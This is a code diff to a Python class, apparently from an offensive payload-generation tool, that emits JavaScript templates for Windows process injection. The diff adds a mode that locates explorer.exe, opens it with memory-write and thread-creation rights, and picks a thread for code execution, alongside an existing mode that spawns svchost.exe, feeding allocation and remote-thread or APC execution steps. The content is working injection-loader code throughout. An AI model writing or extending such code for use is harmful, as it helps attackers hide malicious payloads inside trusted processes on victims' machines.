@@ -4,12 +4,19 @@ import os
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
-        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
-        if 'target' in arguments:
-            self.target = arguments['target'].replace('\\','\\\\')
+
+        self.mode = 'spawn'
+        if 'mode' in arguments:
+            if arguments['mode'] in ['inject', 'spawn']:
+                self.mode = arguments['mode']
+
+        if self.mode == 'inject':
+            self.target = 'explorer.exe'
+        elif self.mode == 'spawn':
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
         self.allocate = 'VirtualAllocEx'
         if 'allocate' in arguments:
@@ -57,7 +64,7 @@ class spawnandinject:
 
     def imports(self) -> list[str]:
         return ['import { ptr } from "bun:ffi";',
-                'import { MemoryAllocationType, MemoryProtection, ProcessCreationFlags, ThreadAccessRights } from "@bun-win32/kernel32";']
+                'import { MemoryAllocationType, MemoryProtection, ProcessCreationFlags, ProcessAccessRights, ThreadAccessRights, ToolhelpSnapshotFlags } from "@bun-win32/kernel32";']
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -67,7 +74,8 @@ class spawnandinject:
 
     def template(self) -> str:
         template = ''
-        template += Template("""    
+        if self.mode == 'spawn':
+            template += Template("""    
     const si = new Uint8Array(104);
     new DataView(si.buffer).setUint32(0, 104, true);
     const pi = new Uint8Array(24);
@@ -78,6 +86,48 @@ class spawnandinject:
     const view = new DataView(pi.buffer);
     const hProcess = view.getBigUint64(0, true);
     const hThread = view.getBigUint64(8, true);
+""").substitute(target=self.target)
+        elif self.mode == 'inject':
+            template += Template("""
+    let hProcSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPPROCESS, 0);
+    let pe32 = new Uint8Array(336);
+    let pe32_view = new DataView(pe32.buffer);
+    pe32_view.setUint32(0, 336, true);
+    let pid = 0;
+
+    {Process32First}(hProcSnap, ptr(pe32));
+
+    while ({Process32Next}(hProcSnap, ptr(pe32))) {{
+        let processname = new Uint8Array(pe32_view.buffer, 44, 260);
+        let nullIndex = processname.indexOf(0);
+        let text = new TextDecoder('utf-8').decode(processname.subarray(0, nullIndex));
+        if (text == '$target'){{
+            pid = pe32_view.getUint32(8, true);
+            console.log(pid);
+            break;
+        }}
+    }}
+    let hProcess = {OpenProcess}( ProcessAccessRights.PROCESS_CREATE_THREAD | ProcessAccessRights.PROCESS_QUERY_INFORMATION | ProcessAccessRights.PROCESS_VM_OPERATION | ProcessAccessRights.PROCESS_VM_READ | ProcessAccessRights.PROCESS_VM_WRITE, false, pid);
+
+    let hThreadSnap = {CreateToolhelp32Snapshot}(ToolhelpSnapshotFlags.TH32CS_SNAPTHREAD, 0);
+    let th32 = new Uint8Array(28);
+    let th32_view = new DataView(th32.buffer);
+    th32_view.setUint32(0, 28, true);
+    let hThread = 0;
+
+    {Thread32First}(hThreadSnap, ptr(th32_view));
+
+    while ({Thread32Next}(hThreadSnap, ptr(th32_view)))
+    {{
+        let parentpid = th32_view.getUint32(12, true);
+        let threadid = th32_view.getUint32(8, true);
+        if (parentpid == pid)
+        {{
+            hThread = {OpenThread}(ThreadAccessRights.THREAD_ALL_ACCESS, false, threadid);
+            break;
+        }}
+    }}
+
 """).substitute(target=self.target)
 
         if self.allocate == 'VirtualAllocEx':
@@ -124,7 +174,7 @@ class spawnandinject:
 
         if self.execute == 'CreateRemoteThread':
             template += """
-    const hThread = {CreateRemoteThread}(hProcess, null, 0, address, 0, 0, null);
+    const newThread = {CreateRemoteThread}(hProcess, null, 0, address, 0, 0, null);
 """
         elif self.execute == 'QueueUserAPC':
             template += """
